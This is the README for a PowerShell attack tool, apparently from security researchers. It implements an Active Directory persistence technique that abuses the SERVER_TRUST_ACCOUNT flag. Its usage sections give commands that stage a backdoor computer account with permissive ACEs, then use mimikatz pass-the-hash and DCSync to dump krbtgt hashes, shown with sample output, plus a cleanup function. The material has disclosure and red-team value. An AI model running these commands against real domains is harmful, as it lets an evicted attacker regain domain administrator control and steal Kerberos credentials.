# Server (Un)Trust Account
Server (Un)Trust Account is an Active Directory persistence technique we uncovered during some other research, and have not seen previously documented. It allows an attacker to regain domain administrator privileges after losing them or being evicted from the network; simply, they must only regain a foothold on any computer. With that, the attacker can abuse documented behavior of the `userAccountControl` value `SERVER_TRUST_ACCOUNT` to promote a previously staged computer account to domain controller privileges.

This code accompanies a [blog post](https://blog.stealthbits.com/server-untrust-account), which provides greater detail.

# Usage

## Add-ServerUntrustAccount
This function creates a computer object with a known password and grants the necessary permissions to exploit `SERVER_TRUST_ACCOUNT` persistence. It is designed to run with domain administrator privileges and performs the following activities:
* Creates a computer object with a known password
* Creates new ACE on the domain object to grant AuthenticatedUsers the Ds-Install-Replica permission
* Creates new ACE on the created computer object to grant AuthenticatedUsers Write UserAccountControl permission 

```
PS > . .\ServerUntrustAccount.ps1
PS > Add-ServerUntrustAccount -ComputerName FakeComputer123 -Password "Abc123!@#"
PS > 
```

## Invoke-ServerUntrustAccount
This function utilizes the permissions and computer object created by Add-ServerUntrustAccount in order to regain domain dominance. It sets the UAC bit flag for `SERVER_TRUST_ACCOUNT`, then uses mimikatz to pass-the-hash as the staged computer account, and finally performs a DCSync to replicate the krbtgt hashes. It is designed to be run by any authenticated user in the domain.

```
PS > . .\ServerUntrustAccount.ps1
PS > Invoke-ServerUntrustAccount -ComputerName FakeComputer123 -Password "Abc123!@#" -MimikatzPath "C:\Windows\Temp\mimikatz.exe"
Hashes for KRBTGT:
  NTHash: a3dd...
  AES128: j916...
  AES256: k093...
```

## Remove-ServerUntrustAccount
This function removes accounts and permissions created using `Add-ServerUntrustAccount`. It performs the following actions:
 * Remove the DS-Install-Replica permission on the domain object for the specified computer or managed service account
 * Remove the modify userAccountControl permission on the specified computer or managed service account object
 * With the deleteComputer switch enabled, also deletes the specified computer or managed service account object

```
PS > . .\ServerUntrustAccount.ps1
PS > Remove-ServerUntrustAccount -ComputerName FakeComputer123 -DeleteComputer

Confirm
Are you sure you want to perform this action?
Performing the operation "Remove" on target "CN=FakeComputer123,CN=Computers,DC=domain,DC=local".
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"):
PS >
